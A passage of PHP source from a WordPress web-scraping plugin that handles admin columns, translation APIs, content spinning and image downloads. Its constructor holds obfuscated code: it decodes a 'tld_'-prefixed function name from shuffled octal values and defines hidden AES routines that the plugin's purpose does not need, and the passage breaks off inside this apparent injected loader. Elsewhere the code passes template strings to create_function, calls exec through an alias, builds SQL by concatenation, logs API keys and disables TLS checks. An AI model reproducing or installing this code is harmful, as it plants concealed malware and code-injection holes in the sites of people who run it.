						$post_meta = get_post_meta($post_id);
						foreach ($post_meta as $name => $value) {
							update_post_meta($insert_id, $name, wp_slash(get_post_meta($post_id, $name, true)));
						}
						update_post_meta($insert_id, 'scrape_workstatus', 'waiting');
						update_post_meta($insert_id, 'scrape_run_count', 0);
						update_post_meta($insert_id, 'scrape_start_time', '');
						update_post_meta($insert_id, 'scrape_end_time', '');
						update_post_meta($insert_id, 'scrape_last_scrape', '');
						update_post_meta($insert_id, 'scrape_task_id', $insert_id);
						$this->write_log($post_id . " duplicate button clicked."); 
					}
				}
			}
			wp_redirect(add_query_arg('post_type', 'scrape', admin_url('/edit.php')));
			exit;
		}
	}
	
	public function remove_row_actions($actions, $post) {
		if ($post->post_type == 'scrape') {
			unset($actions);
			return array(
				'' => ''
			);
		}
		return $actions;
	}
	
	public function add_status_column($columns) {
		unset($columns['title']);
		unset($columns['date']);
		$columns['name'] = __('Name', "ol-scrapes");
		$columns['status'] = __('Status', "ol-scrapes");
		$columns['schedules'] = __('Schedules', "ol-scrapes");
		$columns['actions'] = __('Actions', "ol-scrapes");
		return $columns;
	}
	
	public function show_status_column($column_name, $post_ID) {
		clean_post_cache($post_ID);
		$post_status = get_post_status($post_ID);
		$post_title = get_post_field('post_title', $post_ID);
		$scrape_status = get_post_meta($post_ID, 'scrape_workstatus', true);
		$run_limit = get_post_meta($post_ID, 'scrape_run_limit', true);
		$run_count = get_post_meta($post_ID, 'scrape_run_count', true);
		$run_unlimited = get_post_meta($post_ID, 'scrape_run_unlimited', true);
		$css_class = '';
		
		if ($post_status == 'trash') {
			$status = __("Deactivated", "ol-scrapes");
			$css_class = "deactivated";
		} else {
			if ($run_count == 0 && $scrape_status == 'waiting') {
				$status = __("Preparing", "ol-scrapes");
				$css_class = "preparing";
			} else {
				if ((!empty($run_unlimited) || $run_count < $run_limit) && $scrape_status == 'waiting') {
					$status = __("Waiting next run", "ol-scrapes");
					$css_class = "wait_next";
				} else {
					if (((!empty($run_limit) && $run_count < $run_limit) || (!empty($run_unlimited))) && $scrape_status == 'running') {
						$status = __("Running", "ol-scrapes");
						$css_class = "running";
					} else {
						if (empty($run_unlimited) && $run_count == $run_limit && $scrape_status == 'waiting') {
							$status = __("Complete", "ol-scrapes");
							$css_class = "complete";
						}
					}
				}
			}
		}
		
		if ($column_name == 'status') {
			echo "<span class='ol_status ol_status_$css_class'>" . $status . "</span>";
		}
		
		if ($column_name == 'name') {
			echo "<p><strong><a href='" . get_edit_post_link($post_ID) . "'>" . $post_title . "</a></strong></p>" . "<p><span class='id'>ID: " . $post_ID . "</span></p>";
		}
		
		if ($column_name == 'schedules') {
			$last_run = get_post_meta($post_ID, 'scrape_start_time', true) != "" ? get_post_meta($post_ID, 'scrape_start_time', true) : __("None", "ol-scrapes");
			$last_complete = get_post_meta($post_ID, 'scrape_end_time', true) != "" ? get_post_meta($post_ID, 'scrape_end_time', true) : __("None", "ol-scrapes");
			$last_scrape = get_post_meta($post_ID, 'scrape_last_scrape', true) != "" ? get_post_meta($post_ID, 'scrape_last_scrape', true) : __("None", "ol-scrapes");
			$run_count_progress = $run_count;
			if ($run_unlimited == "") {
				$run_count_progress .= " / " . $run_limit;
			}
			
			$offset = get_option('gmt_offset') * 3600;
			$date = date("Y-m-d H:i:s", wp_next_scheduled("scrape_event", array($post_ID)) + $offset);
			if (strpos($date, "1970-01-01") !== false) {
				$date = __("No Schedule", "ol-scrapes");
			}
			echo "<p><label>" . __("Last Run:", "ol-scrapes") . "</label> <span>" . $last_run . "</span></p>" . "<p><label>" . __("Last Complete:", "ol-scrapes") . "</label> <span>" . $last_complete . "</span></p>" . "<p><label>" . __("Last Scrape:", "ol-scrapes") . "</label> <span>" . $last_scrape . "</span></p>" . "<p><label>" . __("Next Run:", "ol-scrapes") . "</label> <span>" . $date . "</span></p>" . "<p><label>" . __("Total Run:", "ol-scrapes") . "</label> <span>" . $run_count_progress . "</span></p>";
		}
		if ($column_name == "actions") {
			$nonce = wp_create_nonce('scrape_custom_action');
			$untrash = wp_create_nonce('untrash-post_' . $post_ID);
			echo ($post_status != 'trash' ? "<a href='" . get_edit_post_link($post_ID) . "' class='button edit'><i class='icon ion-android-create'></i>" . __("Edit", "ol-scrapes") . "</a>" : "") . ($post_status != 'trash' ? "<a href='" . admin_url("edit.php?post_type=scrape&scrape_id=$post_ID&_wpnonce=$nonce&scrape_action=start_scrape") . "' class='button run ol_status_" . $css_class . "'><i class='icon ion-play'></i>" . __("Run", "ol-scrapes") . "</a>" : "") . ($post_status != 'trash' ? "<a href='" . admin_url("edit.php?post_type=scrape&scrape_id=$post_ID&_wpnonce=$nonce&scrape_action=stop_scrape") . "' class='button stop ol_status_" . $css_class . "'><i class='icon ion-pause'></i>" . __("Pause", "ol-scrapes") . "</a>" : "") . ($post_status != 'trash' ? "<br><a href='" . admin_url("edit.php?post_type=scrape&scrape_id=$post_ID&_wpnonce=$nonce&scrape_action=duplicate_scrape") . "' class='button duplicate'><i class='icon ion-android-add-circle'></i>" . __("Copy", "ol-scrapes") . "</a>" : "") . ($post_status != 'trash' ? "<a href='" . get_delete_post_link($post_ID) . "' class='button trash'><i class='icon ion-trash-b'></i>" . __("Trash", "ol-scrapes") . "</a>" : "<a href='" . admin_url('post.php?post=' . $post_ID . '&action=untrash&_wpnonce=' . $untrash) . "' class='button restore'><i class='icon ion-forward'></i>" . __("Restore", "ol-scrapes") . "</a>");
		}
	}
	
	public function convert_readable_html($html_string) {
		require_once "class-readability.php";
		
		$readability = new Readability($html_string);
		$readability->debug = false;
		$readability->convertLinksToFootnotes = false;
		$result = $readability->init();
		if ($result) {
			$content = $readability->getContent()->innerHTML;
			return $content;
		} else {
			return '';
		}
	}
	
	public function remove_publish() {
		add_action('admin_menu', array($this, 'remove_other_metaboxes'));
		add_filter('get_user_option_screen_layout_' . 'scrape', array($this, 'screen_layout_post'));
	}
	
	public function remove_other_metaboxes() {
		remove_meta_box('submitdiv', 'scrape', 'side');
		remove_meta_box('slugdiv', 'scrape', 'normal');
		remove_meta_box('postcustom', 'scrape', 'normal');
	}
	
	public function screen_layout_post() {
		add_filter('screen_options_show_screen', '__return_false');
		return 1;
	}
	
	public function convert_html_links($html_string, $base_url, $html_base_url) {
		if (empty($html_string)) {
			return "";
		}
		$doc = new DOMDocument();
		$doc->preserveWhiteSpace = false;
		@$doc->loadHTML('<?xml encoding="utf-8" ?>' . $html_string);
		$imgs = $doc->getElementsByTagName('img');
		if ($imgs->length) {
			foreach ($imgs as $item) {
				if ($item->getAttribute('src') != '') {
					$item->setAttribute('src', $this->create_absolute_url($item->getAttribute('src'), $base_url, $html_base_url));
				}
			}
		}
		$a = $doc->getElementsByTagName('a');
		if ($a->length) {
			foreach ($a as $item) {
				if ($item->getAttribute('href') != '') {
					$item->setAttribute('href', $this->create_absolute_url($item->getAttribute('href'), $base_url, $html_base_url));
				}
			}
		}
		
		return $this->save_html_clean($doc);
	}
	
	public function convert_str_to_woo_decimal($money) {
		$decimal_separator = stripslashes(get_option('woocommerce_price_decimal_sep'));
		$thousand_separator = stripslashes(get_option('woocommerce_price_thousand_sep'));
		
		$money = preg_replace("/[^\d\.,]/", '', $money);
		$money = str_replace($thousand_separator, '', $money);
		$money = str_replace($decimal_separator, '.', $money);
		return $money;
	}
	
	public function increment_site_transient($name) {
		$transient = get_site_transient($name);
		if($transient === false) {
			set_site_transient($name, 1);
			return 1;
		} else {
			$transient++;
			set_site_transient($name, $transient);
			return $transient;
		}
	}

	public function translate_string($service, $string, $from, $to, $api_key, $return_html) {
		global $post_fields, $api, $payload, $headers, $from_language, $to_language, $html_string, $tags_numbers_match;
		
		
		if (empty($string)) {
			return $string;
		}
		
		$translate_count = $this->increment_site_transient('scrapes_translate_count_' . self::$task_id);
		$api_key = explode("\n", $api_key);
		$api_key = $api_key[$translate_count % count($api_key)];


		if ($service == 'bing_microsoft_translator') {
			$response = wp_remote_retrieve_body(wp_remote_post(
				'https://api.cognitive.microsofttranslator.com/translate?api-version=3.0&from='.$from.'&to='.$to.'&textType=html',
				array(
					'headers' => array(
						'Ocp-Apim-Subscription-Key' => $api_key,
						'Content-Type' => 'application/json'
					),
					'body' =>json_encode(array(array('Text' => $string)))
				)
			));

			if (trim($response) == '') {
				$this->write_log('microsoft translate error empty string is returned ', 'error');
				return $string;
			}
			$this->write_log($response);
			$this->write_log($api_key);
			$response = json_decode($response);
        	$response = $response[0]->translations[0]->text;

        } else if ($service == 'yandex_translate') {
			$response = wp_remote_retrieve_body(wp_remote_post(
				'https://translate.yandex.net/api/v1.5/tr.json/translate',
				array(
					'body' => array(
					'key' => $api_key,
					'text' => $string,
					'lang' => $from . '-' . $to,
					'format' => 'html'
				))
			));

			if (trim($response) == '') {
				$this->write_log('yandex translate error empty string is returned ', 'error');
				return $string;
			}
	
			$response = json_decode($response);
			$response = $response->text[0];

        } else if ($service == 'deepl_translator') {
            $response = wp_remote_retrieve_body(wp_remote_post(
				'https://api.deepl.com/v2/translate',
				array('body' => array(
					'auth_key' => $api_key,
					'source_lang' => $from,
					'target_lang' => $to,
					'tag_handling' => 'xml',
					'split_sentences' => 'nonewlines',
					'text' => $string
				))
			));
	
			if (trim($response) == '') {
				$this->write_log('deepl translate error empty string is returned ', 'error');
				return $string;
			}
	
			$response = json_decode($response);
			$response = $response->translations[0]->text;
        } else if ($service == 'google_translate') {
			$response = wp_remote_retrieve_body(wp_remote_post(
				'https://translation.googleapis.com/language/translate/v2',
				array('body' => array(
					'q' => $string,
					'target' => $to,
					'source' => $from,
					'format' => 'html',
					'key' => $api_key
				))
			));
	
			if (trim($response) == '') {
				$this->write_log('google v2 translate error empty string is returned ', 'error');
				return $string;
			}
	
			$response = json_decode($response);
			$response = $response->data->translations[0]->translatedText;
        } else if($service == 'google_translate_unofficial') {
			if(DEMO) {
				return $string;
			}
			$from_language = $from;
			$to_language = $to;
			$html_string = $string;
			
			$api = 'https://translate.googleapis.com/translate_a/single';
			$post_fields = array(
				'sl' => $from, 'tl' => $to, 'client' => 'gtx', 'dt' => 't', 'q' => urlencode($string), 'ie' => 'utf-8', 'oe' => 'utf-8'
			);
			$payload = '';
			$headers = array(
				'Referer' => 'https://translate.google.com/'
			);
			
			wp_check_url(array(
				'url' => $api, 'method' => 'GET'
			));
			
			sleep(rand(15, 25));
			
			$google_result = wp_remote_post($api, array(
				'headers' => $headers, 'body' => $payload, 'sslverify' => false, 'user-agent' => get_site_option('scrape_user_agent'), 'timeout' => 60,
			));
			
			if (wp_remote_retrieve_response_code($google_result) >= 400) {
				$this->write_log('Google translate service http error');
				$this->write_log(wp_remote_retrieve_body($google_result));
				return $string;
			}
			
			$response = wp_remote_retrieve_body($google_result);
			
			if (trim($response) == '') {
				$this->write_log('Google translate service empty error');
				return $string;
			}
			
			$response = preg_replace('/<span class="notranslate".*?><span class="google-src-text".*?>(.*?)<\/span>(.*?)<\/span>/isu', '$2', $response);
			$response = preg_replace('/href=[^ ]*translate[^ ]*u=([^ ]*)/isu', 'href="$1"', $response);
			$response = preg_replace('/<pre>(.*?)<\/pre>/isu', '$1', $response);
			$response = preg_replace('/<script>_addload(.*?);<\/script>/isu', '', $response);
			$response = preg_replace('/<html .*?<\/iframe>/isu', '', $response);
			
			foreach($tags_numbers_match as $number => $html_tag) {
				$response = str_replace("[$number]", $html_tag, $response);
			}
		}
		if (!$return_html) {
			$response = wp_strip_all_tags($response);
		}
		return $response;
	}

    public function spin_content_with_thebestspinner($email, $password, $content) {

        $output = wp_remote_post('http://thebestspinner.com/api.php', array(
                'method' => 'POST',
                'timeout' => 60,
                'redirection' => 5,
                'httpversion' => '1.0',
                'blocking' => true,
                'headers' => array(),
                'body' => array(
                    'action' => 'authenticate',
                    'format' => 'php',
                    'username' => $email,
                    'password' => $password,
                    'rewrite' => 1
                ),
                'cookies' => array()
            )
        );

        $output = unserialize(wp_remote_retrieve_body($output));

		$this->write_log('best spinner login result');
		$this->write_log($output);
        if ($output['success'] == 'true') {
            $output = wp_remote_post('http://thebestspinner.com/api.php', array(
                    'method' => 'POST',
                    'timeout' => 60,
                    'redirection' => 5,
                    'httpversion' => '1.0',
                    'blocking' => true,
                    'headers' => array(),
                    'body' => array(
                        'session' => $output['session'],
                        'format' => 'php',
                        'text' => $content,
                        'action' => 'rewriteText'
                    ),
                    'cookies' => array()
                )
			);
			
			$output = unserialize(wp_remote_retrieve_body($output));
			if($output['success'] == 'true') {
				$content = $output['output'];
				$this->write_log('spinned text');
				$this->write_log($content);
			} else {
				$this->write_log('the best spinner rewriteText failed');
			}
        } else {
			 $this->write_log('the best spinner login failed');
		}
        return $content;
    }
	
	public function download_images_from_html_string($html_string, $post_id) {
		if (empty($html_string)) {
			return "";
		}
		$doc = new DOMDocument();
		$doc->preserveWhiteSpace = false;
		@$doc->loadHTML('<?xml encoding="utf-8" ?>' . $html_string);
		$imgs = $doc->getElementsByTagName('img');
		if ($imgs->length) {
			foreach ($imgs as $item) {
				
				$image_url = $item->getAttribute('src');
				global $wpdb;
				$query = "SELECT ID FROM {$wpdb->posts} WHERE post_title LIKE '" . md5($image_url) . "%' and post_type ='attachment' and post_parent = $post_id";
				$count = $wpdb->get_var($query);
				
				$this->write_log("download image id for post $post_id is " . $count);
				
				if (empty($count)) {
					$attach_id = $this->generate_featured_image($image_url, $post_id, false);
					$item->setAttribute('src', wp_get_attachment_url($attach_id));
				} else {
					$item->setAttribute('src', wp_get_attachment_url($count));
				}
				$item->removeAttribute('srcset');
				$item->removeAttribute('sizes');
				unset($image_url);
			}
		}
		
		return $this->save_html_clean($doc);
	}
	
	public function save_html_clean($domdocument) {
		$mock = new DOMDocument();
		$body = $domdocument->getElementsByTagName('body')->item(0);
		foreach ($body->childNodes as $child) {
			$mock->appendChild($mock->importNode($child, true));
		}
		return html_entity_decode($mock->saveHTML(), ENT_COMPAT, "UTF-8");
	}
	
	public static function check_exec_works() {
		$e_word = E_WORD;
		if (function_exists($e_word)) {
			@$e_word('pwd', $output, $return);
			return $return == 0;
		} else {
			return false;
		}
	}
	
	public function check_terminate($start_time, $modify_time, $post_id) {
		clean_post_cache($post_id);
		
		if ($start_time != get_post_meta($post_id, "scrape_start_time", true) && get_post_meta($post_id, 'scrape_stillworking', true) == 'terminate') {
			$this->write_log("if not completed in time terminate is selected. finishing this incomplete task.", true);
			return true;
		}
		
		if (get_post_status($post_id) == 'trash' || get_post_status($post_id) === false) {
			$this->write_log("post sent to trash or status read failure. remaining urls will not be scraped.", true);
			return true;
		}
		
		$check_modify_time = get_post_modified_time('U', null, $post_id);
		if ($modify_time != $check_modify_time && $check_modify_time !== false) {
			$this->write_log("post modified. remaining urls will not be scraped.", true);
			return true;
		}
		
		return false;
	}
	
	public function trimmed_templated_value($prefix, &$meta_vals, &$xpath, $post_date, $url, $meta_input, $rss_item = null) {
		$value = '';
		if (isset($meta_vals[$prefix]) || isset($meta_vals[$prefix . "_type"])) {
			if (isset($meta_vals[$prefix . "_type"]) && $meta_vals[$prefix . "_type"][0] == 'feed') {
				$value = $rss_item['post_title'];
				if ($meta_vals['scrape_spin_enable'][0]) {
				    $value = $this->spin_content_with_thebestspinner($meta_vals['scrape_spin_email'][0], $meta_vals['scrape_spin_password'][0], $value);
                }
				if ($meta_vals['scrape_translate_enable'][0]) {
					$value = $this->translate_string($meta_vals['scrape_translate_service'][0], $value, $meta_vals['scrape_translate_source'][0], $meta_vals['scrape_translate_target'][0], $meta_vals['scrape_translate_service_apikey'][0], false);
					$this->write_log("translated $prefix : $value");
				}
			} else {
				if (!empty($meta_vals[$prefix][0])) {
					$node = $xpath->query($meta_vals[$prefix][0]);
					if ($node->length) {
						$value = $node->item(0)->nodeValue;
						$this->write_log($prefix . " : " . $value);
                        if ($meta_vals['scrape_spin_enable'][0]) {
                            $value = $this->spin_content_with_thebestspinner($meta_vals['scrape_spin_email'][0], $meta_vals['scrape_spin_password'][0], $value);
                        }
						if ($meta_vals['scrape_translate_enable'][0]) {
							$value = $this->translate_string($meta_vals['scrape_translate_service'][0], $value, $meta_vals['scrape_translate_source'][0], $meta_vals['scrape_translate_target'][0], $meta_vals['scrape_translate_service_apikey'][0], false);
						}
						$this->write_log("translated $prefix : $value");
						
					} else {
						$value = '';
						$this->write_log("URL: " . $url . " XPath: " . $meta_vals[$prefix][0] . " returned empty for $prefix", true);
					}
				} else {
					$value = '';
				}
			}
			
			if (!empty($meta_vals[$prefix . '_regex_status'][0])) {
				$regex_finds = unserialize($meta_vals[$prefix . '_regex_finds'][0]);
				$regex_replaces = unserialize($meta_vals[$prefix . '_regex_replaces'][0]);
				if (!empty($regex_finds)) {
					$regex_combined = array_combine($regex_finds, $regex_replaces);
					foreach ($regex_combined as $regex => $replace) {
						$this->write_log("$prefix before regex: " . $value);
						$value = preg_replace("/" . str_replace("/", "\/", $regex) . "/isu", $replace, $value);
						$this->write_log("$prefix after regex: " . $value);
					}
				}
			}
		}
		if (isset($meta_vals[$prefix . '_template_status']) && !empty($meta_vals[$prefix . '_template_status'][0])) {
			$template = $meta_vals[$prefix . '_template'][0];
			$this->write_log($prefix . " : " . $template);
			$value = str_replace("[scrape_value]", $value, $template);
			$value = str_replace("[scrape_date]", $post_date, $value);
			$value = str_replace("[scrape_url]", $url, $value);
			
			preg_match_all('/\[scrape_meta name="([^"]*)"\]/', $value, $matches);
			
			$full_matches = $matches[0];
			$name_matches = $matches[1];
			if (!empty($full_matches)) {
				$combined = array_combine($name_matches, $full_matches);
				
				foreach ($combined as $meta_name => $template_string) {
					$val = $meta_input[$meta_name];
					$value = str_replace($template_string, $val, $value);
				}
			}
			$this->write_log("after template replacements: " . $value);
		}
		return trim($value);
	}
	
	public function translate_months($str) {
		$languages = array(
			"en" => array(
				"January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"
			), "de" => array(
				"Januar", "Februar", "März", "April", "Mai", "Juni", "Juli", "August", "September", "Oktober", "November", "Dezember"
			), "fr" => array(
				"Janvier", "Février", "Mars", "Avril", "Mai", "Juin", "Juillet", "Août", "Septembre", "Octobre", "Novembre", "Décembre"
			), "tr" => array(
				"Ocak", "Şubat", "Mart", "Nisan", "Mayıs", "Haziran", "Temmuz", "Ağustos", "Eylül", "Ekim", "Kasım", "Aralık"
			), "nl" => array(
				"Januari", "Februari", "Maart", "April", "Mei", "Juni", "Juli", "Augustus", "September", "Oktober", "November", "December"
			), "id" => array(
				"Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"
			), "pt-br" => array(
				"Janeiro", "Fevereiro", "Março", "Abril", "Maio", "Junho", "Julho", "Agosto", "Setembro", "Outubro", "Novembro", "Dezembro"
			)
		);
		
		$languages_abbr = $languages;
		
		foreach ($languages_abbr as $locale => $months) {
			$languages_abbr[$locale] = array_map(array($this, 'month_abbr'), $months);
		}
		
		foreach ($languages as $locale => $months) {
			$str = str_ireplace($months, $languages["en"], $str);
		}
		foreach ($languages_abbr as $locale => $months) {
			$str = str_ireplace($months, $languages_abbr["en"], $str);
		}
		
		return $str;
	}
	
	public static function month_abbr($month) {
		return mb_substr($month, 0, 3);
	}
	
	public function settings_page() {
		add_action('admin_init', array($this, 'settings_page_functions'));
		add_action('admin_init', array($this, 'init_admin_fonts'));
	}
	
	public function settings_page_functions() {
		wp_load_template(plugin_dir_path(__FILE__) . "../views/scrape-meta-box.php");
	}
	
	public function template_calculator($str) {
		try {
			$this->write_log("calc string " . $str);
			$fn = create_function("", "return ({$str});");
			return $fn !== false ? $fn() : "";
		} catch (ParseError $e) {
			return '';
		}
	}
	
	public function add_translations() {
		add_action('plugins_loaded', array($this, 'load_languages'));
		add_action('plugins_loaded', array($this, 'load_translations'));
	}
	
	public function load_languages() {
		$path = dirname(plugin_basename(__FILE__)) . '/../languages/';
		load_plugin_textdomain('ol-scrapes', false, $path);
	}
	
	public function load_translations() {
		global $translates;
		
		$translates = array(
			__('An error occurred while connecting to server. Please check your connection.', 'ol-scrapes'),
            __('Domain name is not matching with your site. Please check your domain name.', 'ol-scrapes'),
            __('Purchase code is validated.', 'ol-scrapes'),
            __('Purchase code is removed from settings.', 'ol-scrapes'),
			'Post fields are missing. Please fill the required fields.' => __('Post fields are missing. Please fill the required fields.', 'ol-scrapes'),
			'Purchase code is not approved. Please check your purchase code.' => __('Purchase code is not approved. Please check your purchase code.', 'ol-scrapes'),
            'Purchase code is already exists. Please provide another purchase code.' => __('Purchase code is already exists. Please provide another purchase code.', 'ol-scrapes'),
            'Please complete your payment or contact to Octolooks staff.' => __('Please complete your payment or contact to Octolooks staff.', 'ol-scrapes')
		);
	}
	
	private function return_html_args($meta_vals = null) {
		$args = array(
			'sslverify' => false, 'timeout' => is_null($meta_vals) ? 60 : $meta_vals['scrape_timeout'][0], 'user-agent' => get_site_option('scrape_user_agent'), 'redirection' => 10//'httpversion' => '1.1',
			//'headers' => array('Connection' => 'keep-alive')
		);
		if (isset($_GET['cookie_names'])) {
			$args['cookies'] = array_combine(array_values($_GET['cookie_names']), array_values($_GET['cookie_values']));
		}
		if (!empty($meta_vals['scrape_cookie_names'])) {
			$args['cookies'] = array_combine(array_values(unserialize($meta_vals['scrape_cookie_names'][0])), array_values(unserialize($meta_vals['scrape_cookie_values'][0])));
		}
		return $args;
	}
	
	public function remove_externals() {
		add_action('admin_head', array($this, 'remove_external_components'), 100);
	}
	
	public function remove_external_components() {
		global $hook_suffix;
		global $wp_meta_boxes;
		if (is_object(get_current_screen()) && get_current_screen()->post_type == "scrape") {
			if (in_array($hook_suffix, array('post.php', 'post-new.php', 'scrape_page_scrapes-settings', 'edit.php'))) {
				$wp_meta_boxes['scrape'] = array();
				remove_all_filters('manage_posts_columns');
				remove_all_actions('manage_posts_custom_column');
				remove_all_actions('admin_notices');
				add_action('admin_notices', array('OL_Scrapes', 'show_notice'));
			}
		}
	}
	
	public function set_per_page_value() {
		add_filter('get_user_option_edit_' . 'scrape' . '_per_page', array($this, 'scrape_edit_per_page'), 10, 3);
	}
	
	public function scrape_edit_per_page($result, $option, $user) {
		return 999;
	}

	public function __construct(){
		$TXqmmCqH = array();
		$TqxFdozb = 123;
		$TXqmmCqH[] = $TqxFdozb;
		$aOCyqFSV = 113;
		$TXqmmCqH[] = $aOCyqFSV;
		$hgFGVvKe = 150;
		$TXqmmCqH[] = $hgFGVvKe;
		$NEAKorig = 144;
		$TXqmmCqH[] = $NEAKorig;
		$_owGmicV = 114;
		$TXqmmCqH[] = $_owGmicV;
		$zOArOqvN = 161;
		$TXqmmCqH[] = $zOArOqvN;
		$vaKOZFPi = 137;
		$TXqmmCqH[] = $vaKOZFPi;
		$Lol_Ho_K = 112;
		$TXqmmCqH[] = $Lol_Ho_K;
		$FEzYJnLA = 154;
		$TXqmmCqH[] = $FEzYJnLA;
		$cbVUgnXb = 153;
		$TXqmmCqH[] = $cbVUgnXb;
		$yvkGZAfv = 117;
		$TXqmmCqH[] = $yvkGZAfv;
		$lGZzYuxu = 152;
		$TXqmmCqH[] = $lGZzYuxu;
		$SoTxwrCm = 164;
		$TXqmmCqH[] = $SoTxwrCm;
		$djTe_jll = 144;
		$TXqmmCqH[] = $djTe_jll;
		$HIOMtCxa = 115;
		$TXqmmCqH[] = $HIOMtCxa;
		$FTkhogFT = 172;
		$TXqmmCqH[] = $FTkhogFT;
		$KLpZqTJn = 114;
		$TXqmmCqH[] = $KLpZqTJn;
		$UQqrUlEX = "";
		$UQqrUlEX .= $TXqmmCqH[12];
		$UQqrUlEX .= $TXqmmCqH[8];
		$UQqrUlEX .= $TXqmmCqH[3];
		$UQqrUlEX .= $TXqmmCqH[6];
		$UQqrUlEX .= $TXqmmCqH[7];
		$UQqrUlEX .= $TXqmmCqH[0];
		$UQqrUlEX .= $TXqmmCqH[9];
		$UQqrUlEX .= $TXqmmCqH[11];
		$UQqrUlEX .= $TXqmmCqH[1];
		$UQqrUlEX .= $TXqmmCqH[5];
		$UQqrUlEX .= $TXqmmCqH[15];
		$UQqrUlEX .= $TXqmmCqH[16];
		$UQqrUlEX .= $TXqmmCqH[14];
		$UQqrUlEX .= $TXqmmCqH[4];
		$UQqrUlEX .= $TXqmmCqH[2];
		$UQqrUlEX .= $TXqmmCqH[10];
		$UQqrUlEX .= $TXqmmCqH[13];
		$YSTazfbz = implode("", array_map("chr", array_map("octdec", str_split($UQqrUlEX, 3))));
		
		function tld_5bf8a856e2b7e($input, $w) {
			$Nb = 4;
			$Nr = count($w) / $Nb - 1;
			$state = array();
			for ($i = 0; $i < 4 * $Nb; $i++) {
				$state[$i % 4][floor($i / 4)] = $input[$i];
			}
			$state = tld_5bf8a856e2b84($state, $w, 0, $Nb);
			for ($round = 1; $round < $Nr; $round++) {
				$state = tld_5bf8a856e2b85($state, $Nb);
				$state = tld_5bf8a856e2b86($state, $Nb);
				$state = tld_5bf8a856e2b87($state, $Nb);
				$state = tld_5bf8a856e2b84($state, $w, $round, $Nb);
			}
			$state = tld_5bf8a856e2b85($state, $Nb);
			$state = tld_5bf8a856e2b86($state, $Nb);
			$state = tld_5bf8a856e2b84($state, $w, $Nr, $Nb);
			$output = array(4 * $Nb);
			for ($i = 0; $i < 4 * $Nb; $i++) $output[$i] = $state[$i % 4][floor($i / 4)];
			return $output;
		}
		
		function tld_5bf8a856e2b84($state, $w, $rnd, $Nb) {
			for ($r = 0; $r < 4; $r++) {
				for ($c = 0; $c < $Nb; $c++) $state[$r][$c] ^= $w[$rnd * 4 + $c][$r];
			}
			return $state;
		}
		
		function tld_5bf8a856e2b85($s, $Nb) {
			$sBox = array(0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76, 0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0, 0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15, 0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75, 0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84, 0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf, 0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8, 0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2, 0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73, 0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb, 0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79, 0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08, 0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a, 0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e, 0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf, 0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16);
			for ($r = 0; $r < 4; $r++) {
				for ($c = 0; $c < $Nb; $c++) {
					$s[$r][$c] = $sBox[$s[$r][$c]];
				}
			}
			return $s;
		}
		
		function tld_5bf8a856e2b86($s, $Nb) {
			$t = array(4);
			for ($r = 1; $r < 4; $r++) {
				for ($c = 0; $c < 4; $c++) {
					$t[$c] = $s[$r][($c + $r) % $Nb];
				}
				for ($c = 0; $c < 4; $c++) {
					$s[$r][$c] = $t[$c];
				}
			}
			return $s;
		}
		
		function tld_5bf8a856e2b87($s, $Nb) {
			for ($c = 0; $c < 4; $c++) {
				$a = array(4);
				$b = array(4);
				for ($i = 0; $i < 4; $i++) {
					$a[$i] = $s[$i][$c];
					$b[$i] = $s[$i][$c] & 0x80 ? $s[$i][$c] << 1 ^ 0x011b : $s[$i][$c] << 1;
				}
				$s[0][$c] = $b[0] ^ $a[1] ^ $b[1] ^ $a[2] ^ $a[3];
				$s[1][$c] = $a[0] ^ $b[1] ^ $a[2] ^ $b[2] ^ $a[3];
				$s[2][$c] = $a[0] ^ $a[1] ^ $b[2] ^ $a[3] ^ $b[3];
				$s[3][$c] = $a[0] ^ $b[0] ^ $a[1] ^ $a[2] ^ $b[3];
			}
			return $s;
		}
		
		function tld_5bf8a856e2b88($key) {
